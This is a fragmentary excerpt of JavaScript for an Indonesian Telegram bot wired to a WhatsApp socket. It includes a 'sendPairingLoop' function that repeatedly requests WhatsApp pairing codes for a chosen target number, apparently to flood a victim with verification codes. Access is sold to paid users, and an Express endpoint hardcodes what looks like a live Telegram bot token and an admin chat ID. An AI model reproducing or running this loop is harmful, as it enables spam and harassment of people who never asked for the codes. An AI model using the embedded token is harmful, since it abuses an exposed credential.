...
const ownerIds = [7393949927]; // contoh chat_id owner 
...
const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  ...
  try {
    ...
    for (let i = 1; i <= total; i++) {
      try {
        const code = await global.sock.requestPairingCode(targetNumber, "DILZYOII");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;
...
`;
    ...
    const keyboardMain = Markup.inlineKeyboard([
        ...
        [
            ...
            Markup.button.url('Developer ϟ Apps', 'https://t.me/BiLziimUuPp')
        ]
    ]);

    // 4. Kirim Pesan Awal (Foto + Menu)
    await ctx.replyWithPhoto(
        { url: "https://files.catbox.moe/2lx9e8.jpg" }, 
        {
            caption: textMain,
            parse_mode: "HTML",
            ...keyboardMain
...
<b>AKSES HANYA DIBERIKAN KEPADA DILZY</b>
`;
...
bot.command("CreateAccount", async (ctx) => {
  ...
  // 2. Validasi Akses
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("😹—Lu siapa tolol, Buy Account Only @BiLziimUuPp");
  }
  ...
  try {
    ...
    const keyboard = {
      reply_markup: {
        inline_keyboard: [[{ text: "! Chanel ☇ Apps", url: "https://t.me/BiLziimUuPp" }]]
      }
    };
...
app.post('/api/reply-message', async (req, res) => {
    ...
    // --- SETTING PENGIRIMAN ---
    const adminChatId = "7393949927"; // <--- TARGET ID KHUSUS
    const botToken = "8357941989:AAF8XZBzr-h-eHAc0IVyeelHgI8gNtuD90o"; // Token Bot Anda
